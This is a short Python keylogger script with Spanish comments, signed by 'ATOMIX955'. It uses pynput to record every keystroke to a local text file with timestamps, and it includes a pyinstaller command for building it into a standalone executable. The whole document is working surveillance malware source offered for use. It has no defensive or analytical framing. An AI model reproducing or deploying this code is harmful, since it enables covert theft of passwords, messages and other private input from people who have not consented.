try:
    from pynput import keyboard
    import os , time , sys
    from datetime import datetime
except:
    os.system("pip install pynput")


"""
ECHO POR ATOMIX955 2024

pyinstaller --onefile Captura.py

SI QUERES QUE EL CODIGO SIGA FUNCIONANDO NO  LO TOQUES YO TE ABISE ;-) 

"""


def pression(key):
    try:
        hora = datetime.now()
        texto = hora.strftime("%B  %d/%m/%Y  %H:%M  TOSIX ATOMIX955")
        txt = open("CAPUTARODO_vs_0.0.3.txt","a") 

        if key == keyboard.Key.tab:
            return False

        elif key == keyboard.Key.space:
            txt.write(" ")

        elif key == keyboard.Key.backspace:
            pass    

        elif key == keyboard.Key.enter:
            txt.write("\n" + "\n")
            txt.write("   " + texto)
            txt.write("\n" + "\n")


        
        txt.write(key.char)
        
    except AttributeError:
        print()


with keyboard.Listener(on_press=pression) as comienzo:
    comienzo.join()